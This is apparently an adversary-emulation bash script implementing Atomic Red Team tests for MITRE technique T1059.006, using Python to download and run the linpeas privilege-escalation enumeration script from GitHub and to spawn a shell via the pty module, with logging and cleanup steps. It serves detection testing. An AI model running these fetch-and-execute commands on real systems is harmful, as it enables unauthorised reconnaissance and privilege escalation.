#! /bin/bash

# T1059.006 - Command and Scripting Interpreter: Python

function a() {
    sleep 60
    echo $id
    # Atomic Test 1 - Execute shell script via python's command mode arguement
    which_python=$(which python || which python3 || which python2)
    $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload-1 -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload-1", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
    echo  $(date -u) "Completed T1059.006 - Execute shell script via python's command mode arguement" >> /tmp/attacktest.txt
    sleep 60
}

function b() {
    # Atomic Test 2 - Execute Python via scripts (Linux)
    which_python=$(which python || which python3 || which python2)
    echo 'import requests' > T1059.006.py
    echo 'import os' >> T1059.006.py
    echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
    echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
    echo 'session = requests.session()' >> T1059.006.py
    echo 'source = session.get(url).content' >> T1059.006.py
    echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
    echo 'fd.write(source)' >> T1059.006.py
    echo 'fd.close()' >> T1059.006.py
    echo 'os.system(malicious_command)' >> T1059.006.py
    $which_python T1059.006.py
    echo  $(date -u) "Completed T1059.006 - Execute Python via scripts (Linux)" >> /tmp/attacktest.txt
    sleep 60
}

function c() {
    # Atomic Test 3 - Execute Python via Python executables (Linux)
    which_python=$(which python || which python3 || which python2)
    echo 'import requests' > T1059.006-2.py
    echo 'import os' >> T1059.006-2.py
    echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006-2.py
    echo 'malicious_command = "sh T1059.006-payload-2 -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006-2.py
    echo 'session = requests.session()' >> T1059.006-2.py
    echo 'source = session.get(url).content' >> T1059.006-2.py
    echo 'fd = open("T1059.006-payload-2", "wb+")' >> T1059.006-2.py
    echo 'fd.write(source)' >> T1059.006-2.py
    echo 'fd.close()' >> T1059.006-2.py
    echo 'os.system(malicious_command)' >> T1059.006-2.py
    $which_python -c 'import py_compile; py_compile.compile("T1059.006-2.py", "T1059.006.pyc")'
    $which_python T1059.006.pyc
    echo  $(date -u) "Completed T1059.006 - Execute Python via Python executables (Linux)" >> /tmp/attacktest.txt
    sleep 60
}

function d() {
    # Atomic Test 4 - Python pty module and spawn function used to spawn sh or bash
    which_python=$(which python || which python3 || which python2)
    $which_python -c "import pty;pty.spawn('/bin/sh')"
    exit
    $which_python -c "import pty;pty.spawn('/bin/bash')"
    exit
    echo  $(date -u) "Completed T1059.006 - Python pty module and spawn function used to spawn sh or bash" >> /tmp/attacktest.txt
    sleep 60
}

function z() {
    # Clean up
    rm T1059.006-payload-1
    rm T1059.006.py
    rm T1059.006-payload
    rm T1059.006.pyc
    rm T1059.006-2.py
    echo  $(date -u) "Cleaned up T1059.006" >> /tmp/attacktest.txt
    sleep 60
}

a
b
c
d
z


